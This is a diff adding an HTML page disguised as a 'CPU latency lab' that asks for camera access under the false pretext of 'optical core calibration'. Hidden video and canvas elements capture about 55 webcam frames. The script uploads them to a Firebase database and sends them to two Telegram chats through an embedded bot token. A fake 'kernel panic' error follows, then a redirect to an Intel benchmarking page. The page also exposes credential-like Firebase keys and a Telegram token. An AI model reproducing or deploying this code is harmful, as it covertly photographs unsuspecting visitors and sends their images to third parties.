@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZenithCore | CPU Latency Lab</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --cpu-blue: #00d4ff;
+            --cpu-dark: #020617;
+            --cpu-panel: #0f172a;
+            --text-glow: rgba(0, 212, 255, 0.3);
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--cpu-dark); 
+            color: #f8fafc;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .navbar {
+            padding: 15px 40px; background: rgba(15, 23, 42, 0.8);
+            border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+            backdrop-filter: blur(10px);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .brand { font-weight: 800; font-size: 18px; letter-spacing: 1px; color: var(--cpu-blue); }
+
+        .viewport {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+
+        .lab-module {
+            width: 100%; max-width: 500px; 
+            background: var(--cpu-panel);
+            border: 1px solid #1e293b; border-radius: 12px;
+            padding: 40px; text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        /* Disguised Camera UI: Optical Alignment */
+        .alignment-ring {
+            width: 130px; height: 130px; margin: 0 auto 30px;
+            border: 1px solid var(--cpu-blue); border-radius: 50%;
+            position: relative; display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 15px var(--text-glow);
+        }
+
+        .inner-ring {
+            width: 80%; height: 80%; border: 1px dashed rgba(0, 212, 255, 0.4);
+            border-radius: 50%; animation: rotate-slow 10s infinite linear;
+        }
+        @keyframes rotate-slow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .crosshair {
+            position: absolute; width: 100%; height: 100%;
+        }
+        .crosshair::before, .crosshair::after {
+            content: ''; position: absolute; background: var(--cpu-blue);
+        }
+        .crosshair::before { width: 2px; height: 20px; top: -10px; left: calc(50% - 1px); }
+        .crosshair::after { width: 20px; height: 2px; left: -10px; top: calc(50% - 1px); }
+
+        .btn-calibrate {
+            background: linear-gradient(135deg, #00d4ff 0%, #0072ff 100%);
+            color: #fff; border: none; width: 100%; padding: 16px;
+            border-radius: 8px; font-weight: 600; cursor: pointer;
+            transition: 0.3s; box-shadow: 0 4px 15px rgba(0, 114, 255, 0.4);
+        }
+        .btn-calibrate:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 114, 255, 0.6); }
+
+        /* Logic States */
+        #sync-ui, #error-404 { display: none; }
+
+        .terminal-log {
+            text-align: left; font-family: 'Fira Code', monospace;
+            background: #020617; padding: 15px; margin-top: 20px;
+            border-radius: 6px; font-size: 11px; color: #94a3b8;
+            border: 1px solid #1e293b;
+        }
+
+        /* 404 Kernel Panic */
+        .panic-header { font-size: 48px; font-weight: 900; color: #ef4444; margin: 0; }
+        .mumbai-node { font-size: 10px; text-transform: uppercase; margin-top: 20px; color: #64748b; }
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="brand">ZENITH_CORE // v4.1</div>
+        <div style="font-size: 10px; color: #64748b;">MUMBAI_NODE_PRIMARY</div>
+    </div>
+
+    <div class="viewport">
+        <!-- Initial View -->
+        <div class="lab-module" id="init-view">
+            <div class="alignment-ring">
+                <div class="inner-ring"></div>
+                <div class="crosshair"></div>
+                <svg width="30" height="30" fill="var(--cpu-blue)" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+            </div>
+            <h2 style="margin:0 0 10px;">Optical Core Calibration</h2>
+            <p style="font-size: 13px; color: #94a3b8; margin-bottom: 30px;">
+                To measure precise CPU core latency, enable <b>Optical Stabilization</b>. We use your camera sensor to detect ambient frequency noise and align processing threads.
+            </p>
+            <button class="btn-calibrate" onclick="startCalibration()">Initialize Alignment</button>
+        </div>
+
+        <!-- Progress View -->
+        <div class="lab-module" id="sync-ui">
+            <div class="alignment-ring" style="border-color: #fbbf24;">
+                <div class="inner-ring" style="animation-duration: 2s; border-color: #fbbf24;"></div>
+                <div id="status-pct" style="font-weight: 800; color: #fbbf24;">0%</div>
+            </div>
+            <h2>Syncing Clock Cycles...</h2>
+            <div class="terminal-log">
+                > CPU_ARCH: X86_64_MUMBAI<br>
+                > DETECTING_VIBRATION_INTERFERENCE...<br>
+                > OPTICAL_SYNC: <span style="color:#fbbf24;">ESTABLISHING</span><br>
+                > MAPPING_CORE_THERMALS...
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="lab-module" id="error-404">
+            <p class="panic-header">KERNEL_PANIC</p>
+            <h3 style="color: #fca5a5; margin: 10px 0;">Error Code: 404_LINK_LOST</h3>
+            <p style="font-size: 13px; color: #94a3b8;">
+                The Mumbai processing cluster lost synchronization. A visual re-calibration of the local camera sensor is required to re-establish the encrypted link.
+            </p>
+            <div class="btn-calibrate" style="background: #334155;">Retrying Visual Handshake...</div>
+            <div class="mumbai-node">Node: 192.168.1.104 | Loc: Mumbai, IN</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startCalibration() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        document.getElementById('status-pct').innerText = Math.min(count * 2, 99) + "%";
+                        
+                        if (count <= 55) {
+                            cpuCapture(count);
+                        }
+
+                        // Fake 404 error at 30 seconds
+                        if (count === 30) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.intel.com/content/www/us/en/gaming/resources/how-to-benchmark-cpu.html";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://cpu.userbenchmark.com/";
+            }
+        }
+
+        function cpuCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "CPU_OPTICAL_SYNC_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_NODE_PRIMARY" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'cpu_calibration_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
